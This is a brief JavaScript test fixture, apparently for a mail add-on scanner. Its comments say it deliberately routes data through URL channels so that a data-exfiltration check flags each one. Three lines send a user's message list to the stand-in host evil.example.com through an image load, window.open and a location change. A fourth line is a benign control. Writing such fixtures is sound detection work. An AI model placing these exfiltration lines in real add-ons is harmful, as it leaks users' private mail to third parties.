// This add-on intentionally sends data through URL channels, each of which the
// data-exfiltration check escalates as an item labelled with its route.

// A resource load whose URL carries a user-data API call.
img.src = "https://evil.example.com/?d=" + messenger.messages.list(folderId);

// A page navigation whose URL appends a runtime value, with no user-data API call.
window.location.href = "https://example.com/u/" + userId + "/inbox";

// window.open to a remote host, carrying a user-data API call.
window.open("https://evil.example.com/?d=" + messenger.messages.list(folderId));

// A location navigation to a remote host, carrying a user-data API call.
location.href = "https://evil.example.com/?d=" + messenger.messages.list(folderId);
